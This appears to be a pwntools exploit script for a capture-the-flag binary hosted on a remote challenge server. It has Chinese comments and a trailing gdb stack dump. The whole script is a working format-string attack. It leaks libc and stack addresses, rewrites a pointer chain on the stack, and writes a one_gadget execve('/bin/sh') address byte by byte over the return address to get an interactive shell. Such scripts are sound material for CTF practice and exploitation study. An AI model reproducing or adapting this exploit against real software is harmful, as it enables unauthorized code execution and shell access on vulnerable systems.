from pwn import *
context(arch='amd64', log_level='debug')
 
context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./pwn"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    #io = process(vuln_path)
    io = process([vuln_path])
else:
    io = remote("node5.buuoj.cn", 26760)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

 
def fmt(msg):
    io.sendafter(b"Please enter a keyword\n", msg)
 
#第1次，泄露libc,stack 计算i和ret的位置
fmt("%9$p,%11$p,\0")
libc.address = int(io.recvuntil(b',', drop=True),16) - 240 - libc.sym['__libc_start_main']
stack = int(io.recvuntil(b',', drop=True),16)
ptr_i = stack - 0xef
ptr_rop = stack -0xe0
print(f"{libc.address = :x} {stack = :x} {ptr_i = :x} {ptr_rop = :x}")
 
#修改argv链，让#11->#37->&i
fmt(f"%{ptr_i&0xffff}c%11$hn\0")
 
#由于ret前有mov rax,0 所以可以直接用one
one = p64(libc.address + 0x45226)
for i in range(6):
    #cleak i
    fmt(f"%{ptr_i&0xff}c%11$hhn\0")
    fmt(f"%37$n\0")
    #write rop
    fmt(f"%{(ptr_rop+i)&0xff}c%11$hhn\0")
    fmt(f"%{one[i]}c%37$hhn\0")
 
fmt('\0')
fmt('\0')
 
io.interactive() 

 
'''
0x00007fffffffde30│+0x0000: 0x00007fffffffdf20  →  0x0000000000000001    ← $rsp
0x00007fffffffde38│+0x0008: 0x0000000000000000   #i 0x00007fffffffde3c
0x00007fffffffde40│+0x0010: 0x0000000000400840  ← $rbp
0x00007fffffffde48│+0x0018: 0x00007ffff7820840  →  <__libc_start_main+240> mov edi, eax
0x00007fffffffde50│+0x0020: 0x0000000000000000
0x00007fffffffde58│+0x0028: 0x00007fffffffdf28  →  0x00007fffffffe279  →  "/home/kali/ctf/2407/das/p1/pwn"
0x00007fffffffde60│+0x0030: 0x0000000100000000
0x00007fffffffde68│+0x0038: 0x0000000000400767  →  <main+0> push rbp
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL
'''